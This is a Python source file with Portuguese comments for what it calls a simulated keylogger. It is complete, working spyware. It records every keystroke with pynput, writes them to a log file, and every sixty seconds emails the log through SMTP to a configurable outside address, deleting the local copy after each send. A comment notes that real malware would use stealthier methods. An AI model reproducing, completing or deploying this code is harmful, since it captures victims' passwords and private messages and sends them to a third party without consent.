import os
import threading
import time
import yagmail
from pynput import keyboard

# --- Configurações ---
# ATENÇÃO: Substitua os placeholders abaixo pelas suas credenciais e e-mail de destino.
# Use uma senha de aplicativo (App Password) do seu provedor de e-mail (e.g., Gmail).
EMAIL_USER = "SEU_EMAIL_AQUI@gmail.com"  # E-mail de envio
EMAIL_PASSWORD = "SUA_SENHA_DE_APLICACAO_AQUI" # Senha de Aplicação
EMAIL_TO = "EMAIL_DE_DESTINO_AQUI@exemplo.com" # E-mail que receberá o log
LOG_FILE = "log_captura.txt"
SEND_INTERVAL = 60  # Intervalo de envio em segundos (e.g., 60 segundos)

# Variável global para armazenar as teclas capturadas
keys_buffer = []

def on_press(key):
    """Função chamada quando uma tecla é pressionada."""
    global keys_buffer
    try:
        # Tenta pegar o caractere da tecla
        keys_buffer.append(key.char)
    except AttributeError:
        # Se for uma tecla especial (Shift, Ctrl, Space, etc.)
        if key == keyboard.Key.space:
            keys_buffer.append(' ')
        elif key == keyboard.Key.enter:
            keys_buffer.append('\n[ENTER]\n')
        elif key == keyboard.Key.tab:
            keys_buffer.append('[TAB]')
        elif key == keyboard.Key.backspace:
            keys_buffer.append('[BACKSPACE]')
        else:
            keys_buffer.append(f'[{key.name.upper()}]')

def write_log():
    """Escreve o buffer de teclas no arquivo de log."""
    with open(LOG_FILE, 'a') as f:
        log_content = "".join(keys_buffer)
        f.write(log_content)
    # Limpa o buffer após escrever
    keys_buffer.clear()

def send_email():
    """Envia o arquivo de log por e-mail."""
    global EMAIL_USER, EMAIL_PASSWORD, EMAIL_TO
    
    if EMAIL_USER == "SEU_EMAIL_AQUI@gmail.com" or EMAIL_PASSWORD == "SUA_SENHA_DE_APLICACAO_AQUI":
        print("Keylogger: Credenciais de e-mail não configuradas. Pulando envio.")
        return

    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        # Não envia se o arquivo não existe ou está vazio
        return

    try:
        yag = yagmail.SMTP(EMAIL_USER, EMAIL_PASSWORD)
        yag.send(
            to=EMAIL_TO,
            subject="[LOG] Captura de Teclas - Keylogger Simulado",
            contents="Log de teclas em anexo.",
            attachments=LOG_FILE
        )
        
        # Opcional: Limpar o log após o envio bem-sucedido
        os.remove(LOG_FILE)
        print(f"Keylogger: Log enviado para {EMAIL_TO} e arquivo local limpo.")
        
    except Exception as e:
        # Em um cenário real, o malware tentaria novamente ou usaria um método mais furtivo
        print(f"Keylogger: ERRO ao enviar e-mail: {e}")

def timer_send():
    """Função que gerencia o envio periódico do log."""
    # Garante que o log seja escrito antes de tentar enviar
    if keys_buffer:
        write_log()
    
    send_email()
    
    # Agenda a próxima execução
    threading.Timer(SEND_INTERVAL, timer_send).start()

def main():
    print("Keylogger Simulado: Iniciando captura de teclas.")
    print(f"Log será salvo em: {LOG_FILE}")
    print(f"Envio agendado a cada {SEND_INTERVAL} segundos (se configurado).")
    
    # Inicia o timer para envio periódico
    timer_send()

    # Configura o listener do teclado
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except Exception as e:
            print(f"Erro no listener: {e}")

if __name__ == '__main__':
    main()
